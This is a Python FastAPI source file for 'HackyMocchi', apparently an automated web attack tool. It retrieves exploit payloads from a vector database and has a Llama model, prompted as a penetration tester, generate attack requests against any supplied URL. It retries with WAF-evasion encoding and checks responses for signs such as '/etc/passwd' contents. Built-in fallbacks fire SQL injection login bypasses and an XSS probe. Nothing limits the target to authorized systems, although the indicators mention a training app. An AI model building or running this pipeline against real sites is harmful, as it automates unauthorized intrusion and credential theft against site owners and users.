import os
import sys
import asyncio
import json
import socket
import re
import requests
import urllib3
from typing import AsyncGenerator, List, Optional
from urllib.parse import urlparse

from fastapi import FastAPI
from fastapi.responses import FileResponse, StreamingResponse
from pydantic import BaseModel

# ── [New] Hybrid & Rerank Imports ──────────────────────────────────
from langchain_chroma import Chroma
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_community.retrievers import BM25Retriever
from langchain_classic.retrievers import EnsembleRetriever
from langchain_community.document_compressors.flashrank_rerank import FlashrankRerank
from langchain_core.documents import Document
from groq import Groq

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI(title="HackyMocchi API - Hybrid Edition")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "hackymocchi", "chroma_data")
COLLECTION_KNOWLEDGE = "vuln_knowledge"
COLLECTION_PAYLOADS = "hacking_payloads"

# ── [Class] Security Search Engine (The Brain) ─────────────────────
class SecuritySearchEngine:
    def __init__(self, db_path):
        print("\n[*] 🚀 initializing Hybrid Security Engine...")
        
        # 1. Embeddings 로드
        print("    1. Loading Embeddings (MiniLM-L6)...")
        self.embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
        
        # 2. Chroma (Vector Store) 연결
        print("    2. Connecting to Vector DB...")
        self.vs_payloads = Chroma(
            collection_name=COLLECTION_PAYLOADS, 
            persist_directory=db_path, 
            embedding_function=self.embeddings
        )
        self.vs_vuln = Chroma(
            collection_name=COLLECTION_KNOWLEDGE, 
            persist_directory=db_path, 
            embedding_function=self.embeddings
        )

        # 3. BM25 (Keyword Search) 구축 - 메모리 로딩
        print("    3. Building BM25 Keyword Index (Hybrid)...")
        self.ensemble_retriever = self._build_hybrid_retriever()

        # 4. Reranker (Flashrank) 로드
        print("    4. Loading Reranker (Flashrank)...")
        self.compressor = FlashrankRerank(model="ms-marco-TinyBERT-L-2-v2")

        # 5. Groq Client (LLM Query Optimizer)
        # (주의: 실제 운영 시 환경변수로 관리 권장)
        self.client = Groq(api_key=os.environ.get("GROQ_API_KEY"))
        self.model_name = "llama-3.1-8b-instant"
        print("[+] Engine Ready! (Hybrid + Reranking + Groq)\n")

    def _build_hybrid_retriever(self):
        """
        벡터 DB에 있는 모든 문서를 가져와서 BM25 인덱스를 메모리에 만듭니다.
        그리고 Vector Retriever와 섞어서(Ensemble) 반환합니다.
        """
        try:
            # DB 데이터 가져오기 (Chroma get() 사용)
            docs_pay = self.vs_payloads.get()
            docs_vuln = self.vs_vuln.get()
            
            all_docs = []
            # Payload 문서 변환
            if docs_pay['documents']:
                for t, m in zip(docs_pay['documents'], docs_pay['metadatas']):
                    all_docs.append(Document(page_content=t, metadata=m if m else {}))
            
            # Knowledge 문서 변환
            if docs_vuln['documents']:
                for t, m in zip(docs_vuln['documents'], docs_vuln['metadatas']):
                    all_docs.append(Document(page_content=t, metadata=m if m else {}))

            if not all_docs:
                print("    [!] Warning: DB is empty. Hybrid search disabled.")
                return None

            # A. BM25 Retriever (키워드 검색용)
            bm25_retriever = BM25Retriever.from_documents(all_docs)
            bm25_retriever.k = 15  # 넉넉하게 가져옴

            # B. Chroma Retriever (벡터 검색용 - Payload 위주)
            chroma_retriever = self.vs_payloads.as_retriever(search_kwargs={"k": 15})

            # C. 앙상블 (키워드 60% + 벡터 40%) - 해킹은 정확한 구문(키워드)이 더 중요
            ensemble = EnsembleRetriever(
                retrievers=[bm25_retriever, chroma_retriever],
                weights=[0.6, 0.4] 
            )
            return ensemble
            
        except Exception as e:
            print(f"    [!] Error building hybrid index: {e}")
            return None

    def search(self, user_query: str, tech: str, top_n: int = 5) -> str:
        # 1. Groq로 검색어 최적화 (Multi-Query 효과)
        optimized_query = self._optimize_query(user_query, tech)
        
        # 2. Hybrid Retrieval (BM25 + Vector)
        if self.ensemble_retriever:
            try:
                retrieved_docs = self.ensemble_retriever.invoke(optimized_query)
            except Exception as e:
                print(f"    [!] Retrieval Error: {e}")
                return _web_fallback_context(tech)
        else:
            return _web_fallback_context(tech)

        if not retrieved_docs:
            return _web_fallback_context(tech)

        # 3. Reranking (Flashrank) - 상위 top_n개만 정제
        try:
            reranked_docs = self.compressor.compress_documents(
                documents=retrieved_docs, 
                query=optimized_query
            )
            final_docs = reranked_docs[:top_n]
        except Exception as e:
            print(f"    [!] Rerank Error: {e}")
            final_docs = retrieved_docs[:top_n]

        # 4. 결과 포맷팅
        context_parts = []
        for doc in final_docs:
            score = doc.metadata.get("relevance_score", 0) # Flashrank가 점수 넣어줌
            clean_content = doc.page_content.replace("\n", " ").strip()
            context_parts.append(f"- [Score:{score:.2f}] {clean_content}")
            
        return "\n".join(context_parts)

    def _optimize_query(self, query: str, tech: str) -> str:
        prompt = (
            f"Convert this user intent into a specific technical search query for a CVE/Exploit database.\n"
            f"Tech Stack: {tech}\n"
            f"User Intent: {query}\n"
            f"Output ONLY the English search keywords (max 5 words). Example: 'Apache Struts OGNL RCE payload'"
        )
        try:
            res = self.client.chat.completions.create(
                messages=[{"role": "user", "content": prompt}],
                model=self.model_name,
                temperature=0.1, max_tokens=60
            )
            return res.choices[0].message.content.strip()
        except:
            return f"{tech} {query} exploit payload"

# 전역 엔진 변수 (Startup 때 로드됨)
search_engine = None


class AnalyzeRequest(BaseModel):
    target_url: str


@app.on_event("startup")
async def startup_event():
    global search_engine
    if os.path.exists(DB_PATH):
        search_engine = SecuritySearchEngine(DB_PATH)
    else:
        print(f"[!] DB Path not found at {DB_PATH}")


@app.get("/")
async def index():
    return FileResponse(os.path.join(BASE_DIR, "index.html"))


@app.post("/api/analyze")
async def analyze(req: AnalyzeRequest):
    return StreamingResponse(
        run_pipeline(req.target_url),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


def emit(event_type: str, data: dict) -> str:
    return f"event: {event_type}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"


# ── Pipeline Logic ───────────────────────────────────────────────────
async def run_pipeline(target_url: str) -> AsyncGenerator[str, None]:
    steps = ["recon", "retrieve", "generate", "exploit", "report"]
    yield emit("pipeline_init", {"steps": steps})

    state = {
        "target_url": target_url, "target_ip": "Unknown", 
        "detected_tech": "Web Vulnerability", "server": "Unknown",
        "context": "", "final_payload": target_url, 
        "is_success": False, "attempts": 0, "last_feedback": "None",
        "http_method": "GET", "post_data": {}, "_doc_count": 0,
        "_explanation": "", "_status_code": None, "_indicators_found": [],
    }

    # Step 0: Recon
    yield emit("step_update", {"index": 0, "status": "running"})
    try:
        result = await asyncio.to_thread(_recon, state)
        state.update(result)
    except Exception as e: state["last_feedback"] = str(e)
    yield emit("stage", {"stage": "recon_result", "data": {"ip": state["target_ip"], "server": state["server"], "tech": state["detected_tech"]}})
    yield emit("step_update", {"index": 0, "status": "complete"})

    # Step 1: Retrieve (Hybrid + Rerank)
    yield emit("step_update", {"index": 1, "status": "running"})
    try:
        if search_engine:
            # 엔진에게 "이 기술에 대한 공격 페이로드를 찾아줘"라고 요청
            context_text = await asyncio.to_thread(
                search_engine.search, 
                user_query="authentication bypass RCE injection payloads", 
                tech=state['detected_tech'],
                top_n=5
            )
            state["context"] = context_text
            state["_doc_count"] = 5 if context_text else 0
        else:
            state["context"] = _web_fallback_context(state["detected_tech"])
            state["_doc_count"] = 0
            
    except Exception as e:
        state["context"] = f"Error: {e}. " + _web_fallback_context(state["detected_tech"])
        
    yield emit("stage", {"stage": "retrieve_result", "data": {"doc_count": state["_doc_count"], "context_length": len(state["context"])}})
    yield emit("step_update", {"index": 1, "status": "complete"})

    # Steps 2+3: Generate -> Exploit Loop
    MAX_ATTEMPTS = 5
    while not state["is_success"] and state["attempts"] < MAX_ATTEMPTS:
        attempt_num = state["attempts"] + 1
        
        # Step 2: Generate (Groq 사용으로 변경)
        yield emit("step_update", {"index": 2, "status": "running"})
        try:
            result = await asyncio.wait_for(asyncio.to_thread(_generate, state), timeout=60)
            state.update(result)
        except Exception as e:
            fallback = _rule_based_payload(state, attempt_num)
            state.update({"final_payload": fallback["url"], "http_method": fallback["method"], "post_data": fallback["data"], "_explanation": f"[Fallback] Rule-based (Error: {str(e)[:20]})"})
            
        yield emit("stage", {"stage": "generate_result", "data": {"url": state["final_payload"], "method": state["http_method"], "post_data": state["post_data"], "explanation": state["_explanation"], "attempt": attempt_num}})
        yield emit("step_update", {"index": 2, "status": "complete"})

        # Step 3: Exploit
        yield emit("step_update", {"index": 3, "status": "running"})
        try:
            result = await asyncio.to_thread(_exploit, state)
            state.update(result)
        except Exception as e:
            state["is_success"] = False
            state["attempts"] += 1
            state["last_feedback"] = str(e)
            
        yield emit("stage", {"stage": "exploit_result", "data": {
            "is_success": state["is_success"], "attempt": state["attempts"], 
            "feedback": state["last_feedback"], "status_code": state.get("_status_code"),
            "indicators_found": state.get("_indicators_found", []),
            "response_preview": state.get("_response_preview", ""),
            "target_url": target_url
        }})
        yield emit("step_update", {"index": 3, "status": "complete"})
        
        if state["is_success"]: break

    # Step 4: Report
    yield emit("step_update", {"index": 4, "status": "running"})
    report_text = _build_report(state)
    yield emit("stage", {"stage": "report_result", "data": {"report": report_text}})
    yield emit("step_update", {"index": 4, "status": "complete"})
    
    yield emit("done", {"is_success": state["is_success"], "attempts": state["attempts"], "target_url": target_url, "ip": state["target_ip"], "tech": state["detected_tech"]})

# ── Helper Functions ────────────────────────────────────────────────
def _recon(state: dict) -> dict:
    url = state["target_url"]
    try:
        domain = urlparse(url).netloc.split(":")[0]
        ip = socket.gethostbyname(domain)
        res = requests.get(url, timeout=5, verify=False)
        server = res.headers.get("Server", "Unknown")
        tech = "General Web"
        if "Apache" in server: tech = "Apache"
        elif "Nginx" in server: tech = "Nginx"
        elif "IIS" in server: tech = "IIS"
        elif "Express" in server: tech = "Node.js"
        return {"target_ip": ip, "detected_tech": tech, "server": server}
    except:
        return {"target_ip": "Unknown", "detected_tech": "Web Vulnerability", "server": "Error"}

def _generate(state: dict) -> dict:
    # 기존 Ollama 대신 Groq를 사용하여 속도와 정확도 향상
    client = Groq(api_key=os.environ.get("GROQ_API_KEY"))
    
    prompt = f"""You are a Penetration Tester.
Target: {state['target_url']} ({state['detected_tech']})
Context (Exploits):
{state['context'][:1500]}
Last Feedback: {state['last_feedback']}

Task: Generate ONE specific web attack payload (JSON).
Rules:
1. Use the Context payloads if relevant.
2. If last attempt failed (403/WAF), try encoding or a different technique.
3. Output JSON ONLY: {{"url":"...", "method":"POST", "data":{{...}}, "explanation":"..."}}
"""
    try:
        res = client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama-3.1-8b-instant", temperature=0.6
        )
        json_str = res.choices[0].message.content
        match = re.search(r"\{.*\}", json_str, re.DOTALL)
        if not match: raise ValueError("No JSON")
        data = json.loads(match.group())
        return {
            "final_payload": data.get("url", state["target_url"]),
            "http_method": data.get("method", "GET"),
            "post_data": data.get("data", {}),
            "_explanation": data.get("explanation", "")
        }
    except Exception as e:
        raise e

def _exploit(state: dict) -> dict:
    payload = state["final_payload"]
    method = state.get("http_method", "GET")
    data = state.get("post_data", {})
    
    success_indicators = [
        "token", "admin@juice-sh.op", "password", "root:x:0:0:",
        "uid=", "SQL syntax", "You have an error in your SQL", "acquisitions"
    ]
    
    try:
        if method == "POST":
            res = requests.post(payload, json=data, timeout=8, verify=False)
        else:
            res = requests.get(payload, timeout=8, verify=False)
            
        found = [i for i in success_indicators if i.lower() in res.text.lower()]
        is_success = len(found) > 0
        
        feedback = f"Status {res.status_code}"
        if is_success: feedback = "Success indicators found!"
        elif res.status_code == 403: feedback = "Blocked (403)"
        elif res.status_code == 500: feedback = "Server Error (Potential Vuln)"

        return {
            "is_success": is_success,
            "attempts": state["attempts"] + 1,
            "last_feedback": feedback,
            "_status_code": res.status_code,
            "_indicators_found": found,
            "_response_preview": res.text[:200]
        }
    except Exception as e:
        return {"is_success": False, "attempts": state["attempts"] + 1, "last_feedback": str(e)}

def _build_report(state: dict) -> str:
    status = "성공 ✅" if state["is_success"] else "실패 ❌"
    return f"## Report\nTarget: {state['target_url']}\nResult: {status}\nPayload: `{state['final_payload']}`\nFound: {state['_indicators_found']}"

def _web_fallback_context(tech):
    return f"Try SQLi ' OR 1=1-- or XSS <script>alert(1)</script> for {tech}"

def _rule_based_payload(state, attempt):
    # 기존 규칙 기반 폴백 유지 (코드 간소화를 위해 핵심만 남김)
    base = state["target_url"].rstrip("/")
    attacks = [
        {"url": f"{base}/rest/user/login", "method": "POST", "data": {"email": "' OR 1=1--", "password": "x"}, "explanation": "SQLi Auth Bypass"},
        {"url": f"{base}/api/login", "method": "POST", "data": {"email": "admin'--", "password": "x"}, "explanation": "SQLi Admin Bypass"},
        {"url": f"{base}/search?q=<script>alert(1)</script>", "method": "GET", "data": {}, "explanation": "XSS Probe"}
    ]
    return attacks[(attempt - 1) % len(attacks)]

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)